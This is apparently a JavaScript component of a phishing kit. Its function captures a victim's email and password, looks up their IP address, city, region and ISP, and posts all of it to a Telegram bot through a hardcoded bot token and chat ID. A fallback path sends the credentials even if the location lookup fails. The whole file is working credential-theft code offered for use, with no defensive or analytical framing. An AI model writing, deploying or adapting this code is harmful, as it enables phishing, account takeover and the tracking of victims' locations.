// closalook.js - Fixed Telegram integration with multiple IP services
(function() {
    'use strict';
    
    // Multiple IP/location services for fallback
    const ipServices = [
        {
            name: 'ipapi',
            ipUrl: 'https://api.ipify.org?format=json',
            geoUrl: (ip) => `https://ipapi.co/${ip}/json/`
        },
        {
            name: 'ip-api',
            ipUrl: 'http://ip-api.com/json/',
            geoUrl: (ip) => `http://ip-api.com/json/${ip}`
        },
        {
            name: 'geolocation',
            ipUrl: 'https://api64.ipify.org?format=json',
            geoUrl: (ip) => `https://geolocation-db.com/json/${ip}`
        }
    ];

    // Function to get IP with fallback
    async function getIPAddress() {
        for (let service of ipServices) {
            try {
                console.log(`Trying IP service: ${service.name}`);
                const response = await fetch(service.ipUrl, {
                    method: 'GET',
                    mode: 'cors'
                });
                
                if (response.ok) {
                    const data = await response.json();
                    const ip = data.ip || data.query;
                    if (ip) {
                        console.log(`Got IP from ${service.name}: ${ip}`);
                        return { ip, service };
                    }
                }
            } catch (error) {
                console.warn(`Service ${service.name} failed:`, error);
                continue;
            }
        }
        throw new Error('All IP services failed');
    }

    // Function to get location info
    async function getLocationInfo(ip, service) {
        try {
            console.log(`Getting location from ${service.name} for IP: ${ip}`);
            
            if (service.name === 'ipapi') {
                const response = await fetch(service.geoUrl(ip));
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    countryCode: data.country_code || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } else if (service.name === 'ip-api') {
                const response = await fetch(service.geoUrl(ip));
                const data = await response.json();
                return {
                    country: data.country || 'Unknown',
                    countryCode: data.countryCode || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.regionName || 'Unknown',
                    isp: data.isp || 'Unknown'
                };
            } else {
                // geolocation service
                const response = await fetch(service.geoUrl(ip));
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    countryCode: data.country_code || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.state || 'Unknown',
                    isp: data.ISP || 'Unknown'
                };
            }
        } catch (error) {
            console.warn(`Location service failed:`, error);
            return {
                country: 'Unknown',
                countryCode: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                isp: 'Unknown'
            };
        }
    }

    // Global function to send data to Telegram
    window.sendToTelegram = async function(email, password, attemptCount = 1) {
        try {
            console.log(`Sending attempt ${attemptCount} to Telegram...`);
            
            // Get IP address with fallback
            const { ip, service } = await getIPAddress();
            
            // Get location information
            const locationInfo = await getLocationInfo(ip, service);
            
            // Telegram bot configuration - UPDATE THESE WITH YOUR ACTUAL CREDENTIALS
            const botToken = "5297600586:AAFe0V0vhS5obIcmiiwhdmLaVsRJ7QWhOd4";
            const chatId = "-1002675821270";

            const message = `🔐 Login Attempt #${attemptCount}
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ip}
📍 Country: ${locationInfo.country} (${locationInfo.countryCode})
🏙️ City: ${locationInfo.city}
🏛️ Region: ${locationInfo.region}
📡 ISP: ${locationInfo.isp}
⚡ Service: ${service.name}`;

            console.log(`Sending to Telegram:`, message);

            const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "HTML"
                })
            });

            if (telegramRes.ok) {
                console.log("✅ Successfully sent to ");
                return true;
            } else {
                const errorText = await telegramRes.text();
                console.error("❌  API error:", errorText);
                return false;
            }
        } catch (error) {
            console.error("❌  send error:", error);
            
            // Fallback: Try to send basic info even if IP/location fails
            try {
                const botToken = "5297600586:AAFe0V0vhS5obIcmiiwhdmLaVsRJ7QWhOd4";
                const chatId = "-1002675821270";
                
                const fallbackMessage = `🔐 Login Attempt #${attemptCount}
📧 Email: ${email}
🔑 Password: ${password}
❌ Location: Failed to retrieve
⚡ Attempt: ${attemptCount}`;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: fallbackMessage,
                        parse_mode: "HTML"
                    })
                });
            } catch (fallbackError) {
                console.error("❌ Fallback also failed:", fallbackError);
            }
            
            return false;
        }
    };

    // Initialize when DOM is loaded
    document.addEventListener('DOMContentLoaded', function() {
        console.log('✅ closalos loaded successfully');
        
        // Verify the function is available globally
        if (typeof window.sendToTelegram === 'function') {
            console.log('✅  function is ready');
        }
        
        // Test IP detection (optional - remove in production)
        // this.testIPDetection();
    });

    // Test function (optional - remove in production)
    window.testIPDetection = async function() {
        try {
            console.log('🧪 Testing IP detection...');
            const { ip, service } = await getIPAddress();
            const location = await getLocationInfo(ip, service);
            console.log('✅ IP Test successful:', { ip, service: service.name, location });
        } catch (error) {
            console.error('❌ IP Test failed:', error);
        }
    };

})();
